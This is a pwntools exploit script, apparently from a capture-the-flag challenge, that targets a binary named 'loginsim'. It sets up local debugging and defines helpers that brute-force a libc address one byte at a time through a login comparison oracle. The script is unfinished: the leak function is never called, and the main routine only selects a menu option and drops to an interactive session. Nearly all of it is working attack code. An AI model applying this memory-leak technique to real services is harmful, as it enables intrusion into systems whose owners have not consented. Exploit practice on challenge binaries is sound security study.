#!/usr/bin/env python3
from pwn import *

QWORD = 8
DUMMY = 0xdeadbeefdeadbeef
PAD = lambda n: b"a" * n

ld = ELF("./given/ld.so")
libc = ELF("./given/libc.so.6")
elf = ELF("./given/loginsim")
context.arch = elf.arch
context.terminal = ["tmux", "splitw", "-h"]

if args.REMOTE:
    p = remote()
else:
    p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
    if args.D:
        with open(f"/proc/{p.pid}/maps", "rb") as f:
            maps = f.read()
            f.close()
        regions = maps.split(b"\n")
        pie_base = None
        for region in regions:
            if b"/given/loginsim" in region:
                pie_base = int(region[:region.find(b"-")], 16)
                break
        if pie_base is None:
            quit()
        gdb.attach(p, "\n".join([
            #f"b *{hex(pie_base + 0x142f)}", # _register
            f"b *{hex(pie_base + 0x1657)}", #main's ret
            #f"b *{hex(pie_base + 0x1474)}", #register's scanf
            #f"b *{hex(pie_base + 0x1404)}", #strncmp
        ]))

def register(length, username=b""):
    assert(1 <= length <= 0x80)
    p.sendlineafter(b"-> ", b"1")
    p.sendlineafter(b"{i} Username length: ", str(length).encode())
    p.sendlineafter(b"{i} Enter username: ", username)

def login(username):
    p.sendlineafter(b"-> ", b"2")
    p.sendlineafter(b"{i} Username: ", username)
    msg = p.recvline()
    #print(msg)
    return b"Good job! :^)" in msg

def leak_libc():
    payload = PAD(0x58)
    for i in range(6):
        register(0x58 + i + 1, payload)
        success = False
        for b in range(1, 256):
            if b in [ord("\n"), ord(" ")]:
                continue
            success = login(payload + p8(b))
            if success:
                log.info(f"byte found {hex(b)}")
                payload += p8(b)
                break
        if not success:
            log.info("Cannot find this byte")
            quit()

    leak = u64(payload[-6:].ljust(8, b"\x00"))
    log.info(f"Found libc leak: {hex(leak)}")
    return leak

def exploit():
    p.sendlineafter(b"-> ", b"3")
    p.interactive()

if __name__ == "__main__":
    exploit()
